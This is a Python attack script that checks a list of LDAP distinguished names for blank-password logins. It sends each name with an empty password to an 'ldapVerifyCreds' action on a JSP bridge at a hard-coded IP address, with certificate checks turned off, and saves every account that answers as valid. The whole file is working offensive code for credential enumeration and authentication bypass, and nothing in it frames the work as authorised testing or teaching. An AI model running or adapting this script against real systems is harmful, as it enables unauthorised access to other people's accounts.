#!/usr/bin/env python3
import requests
import urllib.parse
import sys

# Disable SSL warnings (self-signed cert on 196.1.70.128)
requests.packages.urllib3.disable_warnings()

URL = "https://196.1.70.128:9443/STRATOS_ROOT/wsodbbridge.jsp"
INPUT_FILE = "/tmp/users.txt"
OUTPUT_FILE = "/tmp/blank_valid.txt"

def main():
    try:
        with open(INPUT_FILE, "r") as f:
            dns = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[-] Cannot read {INPUT_FILE}: {e}", file=sys.stderr)
        sys.exit(1)

    valid = []
    total = len(dns)
    for i, dn in enumerate(dns, 1):
        print(f"[*] Testing ({i}/{total}): {dn}")
        params = {
            "action": "ldapVerifyCreds",
            "dn": dn,
            "password": ""   # blank
        }
        try:
            resp = requests.get(URL, params=params, verify=False, timeout=10)
            # Expected response: {"success":true,"valid":true} or similar
            if "true" in resp.text.lower():
                valid.append(dn)
                print(f"[+] VALID: {dn}")
        except Exception as e:
            print(f"[-] Error testing {dn}: {e}")

    # Write results
    with open(OUTPUT_FILE, "w") as f:
        for dn in valid:
            f.write(dn + "\n")
    print(f"\n[+] Done. Found {len(valid)} accounts with blank password. Results saved to {OUTPUT_FILE}")

if __name__ == "__main__":
    main()